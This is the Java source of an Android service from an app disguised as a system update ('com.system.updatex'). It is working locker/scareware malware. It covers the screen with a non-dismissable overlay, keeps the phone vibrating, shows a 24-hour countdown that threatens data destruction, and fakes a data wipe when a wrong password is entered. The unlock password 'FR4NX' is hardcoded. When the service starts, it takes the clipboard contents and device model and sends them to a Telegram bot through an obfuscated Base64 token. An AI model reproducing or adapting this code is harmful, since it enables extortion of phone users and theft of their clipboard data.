package com.system.updatex;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Base64;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class OverlayService extends Service {
    private static final String CHANNEL_ID = "fr4nx_kiosk";
    private static final int NOTIFICATION_ID = 9001;

    private WindowManager windowManager;
    private WindowManager.LayoutParams windowParams;
    private View overlay;
    private FrameLayout rootView;
    
    private EditText authInput;
    private Button authButton;
    private TextView countdownTimer;
    private TextView statusText;
    private ProgressBar actionProgressBar;

    private int tapCount = 0;
    private long firstTapTime = 0L;
    private boolean overlayAttached = false;
    private boolean authVisible = false;
    private boolean shuttingDown = false;

    private CountDownTimer timer;
    private Vibrator vibrator;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "FR4NX", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(channel);
            startForeground(NOTIFICATION_ID, new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("FR4NX")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .build());
        }

        // Start Telegram Exfil Thread
        new Thread(this::exfiltrateData).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!Settings.canDrawOverlays(this)) {
            stopSelf();
            return START_NOT_STICKY;
        }
        
        boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE).getBoolean("is_unlocked", false);
        if (isUnlocked) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if (!overlayAttached) {
            createOverlay();
            startPsychologicalPressure();
        }
        return START_STICKY;
    }

    private void createOverlay() {
        if (overlayAttached) return;
        
        windowParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
        );
        windowParams.gravity = Gravity.TOP | Gravity.START;
        windowParams.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        overlay = LayoutInflater.from(this).inflate(R.layout.overlay_lock, null);
        rootView = (FrameLayout) overlay;
        
        authInput = overlay.findViewById(R.id.authInput);
        authButton = overlay.findViewById(R.id.authButton);
        countdownTimer = overlay.findViewById(R.id.countdownTimer);
        statusText = overlay.findViewById(R.id.statusText);
        actionProgressBar = overlay.findViewById(R.id.actionProgressBar);

        if (authInput != null) authInput.setVisibility(View.GONE);
        if (authButton != null) authButton.setVisibility(View.GONE);

        if (authButton != null && authInput != null) {
            authButton.setOnClickListener(v -> authenticateUser());
        }
        if (authInput != null) {
            authInput.setSingleLine(true);
            authInput.setImeOptions(EditorInfo.IME_ACTION_DONE);
            authInput.setOnEditorActionListener((view, actionId, event) -> {
                if (actionId == EditorInfo.IME_ACTION_DONE) {
                    authenticateUser();
                    return true;
                }
                return false;
            });
        }

        rootView.setOnTouchListener((view, event) -> {
            if (authVisible) return false;
            if (event.getAction() != MotionEvent.ACTION_UP) return false;
            float x = event.getX();
            float y = event.getY();
            if (!(x >= 0 && x <= 150f && y >= 0 && y <= 150f)) {
                tapCount = 0;
                return false;
            }
            long currentTime = SystemClock.elapsedRealtime();
            if (tapCount == 0 || currentTime - firstTapTime > 3000L) {
                tapCount = 1;
                firstTapTime = currentTime;
            } else {
                tapCount++;
            }
            if (tapCount >= 5) {
                tapCount = 0;
                revealAuthentication();
            }
            return false;
        });

        try {
            windowManager.addView(overlay, windowParams);
            overlayAttached = true;
        } catch (Exception e) {
            stopSelf();
        }
    }

    private void startPsychologicalPressure() {
        // 1. Vibration Loop
        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null && vibrator.hasVibrator()) {
            long[] pattern = {0, 1000, 1000};
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
            } else {
                vibrator.vibrate(pattern, 0);
            }
        }

        // 2. Countdown Timer
        timer = new CountDownTimer(24 * 60 * 60 * 1000L, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                int hours = (int) (millisUntilFinished / (1000 * 60 * 60));
                int minutes = (int) ((millisUntilFinished / (1000 * 60)) % 60);
                int seconds = (int) (millisUntilFinished / 1000) % 60;
                String time = String.format("%02d:%02d:%02d", hours, minutes, seconds);
                if (countdownTimer != null) countdownTimer.setText(time);
            }

            @Override
            public void onFinish() {
                if (countdownTimer != null) countdownTimer.setText("SYSTEM DATA DESTROYED");
            }
        }.start();
    }

    private void revealAuthentication() {
        if (authVisible || authInput == null || authButton == null) return;
        authVisible = true;
        authInput.setVisibility(View.VISIBLE);
        authButton.setVisibility(View.VISIBLE);
        authInput.requestFocus();
        authInput.post(() -> {
            InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            if (imm != null) imm.showSoftInput(authInput, InputMethodManager.SHOW_IMPLICIT);
        });
    }

    private void authenticateUser() {
        if (shuttingDown || authInput == null) return;
        String pass = authInput.getText().toString().trim();
        
        authInput.setVisibility(View.GONE);
        authButton.setVisibility(View.GONE);
        statusText.setVisibility(View.VISIBLE);
        actionProgressBar.setVisibility(View.VISIBLE);
        actionProgressBar.setProgress(0);

        if ("FR4NX".equals(pass)) {
            shuttingDown = true;
            statusText.setTextColor(0xFF00FF00);
            statusText.setText("DECRYPTING SYSTEM FILES...");
            
            handler.post(new Runnable() {
                int progress = 0;
                @Override
                public void run() {
                    if (progress <= 100) {
                        actionProgressBar.setProgress(progress);
                        progress += 5;
                        handler.postDelayed(this, 500);
                    } else {
                        unlockOverlay();
                    }
                }
            });
        } else {
            statusText.setTextColor(0xFFFF0000);
            statusText.setText("WARNING: WIPING SYSTEM DATA...");
            
            handler.post(new Runnable() {
                int progress = 0;
                @Override
                public void run() {
                    if (progress <= 100) {
                        actionProgressBar.setProgress(progress);
                        progress += 10;
                        handler.postDelayed(this, 500);
                    } else {
                        statusText.setVisibility(View.GONE);
                        actionProgressBar.setVisibility(View.GONE);
                        authInput.setVisibility(View.VISIBLE);
                        authButton.setVisibility(View.VISIBLE);
                        authInput.setText("");
                    }
                }
            });
        }
    }

    private void unlockOverlay() {
        shuttingDown = true;
        if (timer != null) timer.cancel();
        if (vibrator != null) vibrator.cancel();
        handler.removeCallbacksAndMessages(null);

        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).apply();

        if (overlayAttached && overlay != null) {
            try { windowManager.removeView(overlay); } catch (Exception ignored) {}
            overlayAttached = false;
        }
        stopForeground(true);
        stopSelf();
    }

    private void exfiltrateData() {
        try {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            String clip = "";
            if (clipboard != null && clipboard.hasPrimaryClip()) {
                ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                clip = item.getText() != null ? item.getText().toString() : "";
            }
            String device = Build.MANUFACTURER + " " + Build.MODEL;
            String message = "FR4NX Hit!\nDevice: " + device + "\nClipboard: " + clip;
            
            String token = new String(Base64.decode("OTAzMjQ2NjQzNzpBQUVGOGlmeEp2R001Z2hVRkNmRWNOUGJCNUdjSGlYdC1VWQ==", Base64.DEFAULT));
            URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            String postData = "chat_id=9032466437&text=" + java.net.URLEncoder.encode(message, "UTF-8");
            OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
        } catch (Exception ignored) {}
    }

    @Override
    public void onDestroy() {
        if (timer != null) timer.cancel();
        if (vibrator != null) vibrator.cancel();
        handler.removeCallbacksAndMessages(null);
        
        if (overlayAttached && overlay != null) {
            try { windowManager.removeView(overlay); } catch (Exception ignored) {}
        }
        stopForeground(true);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
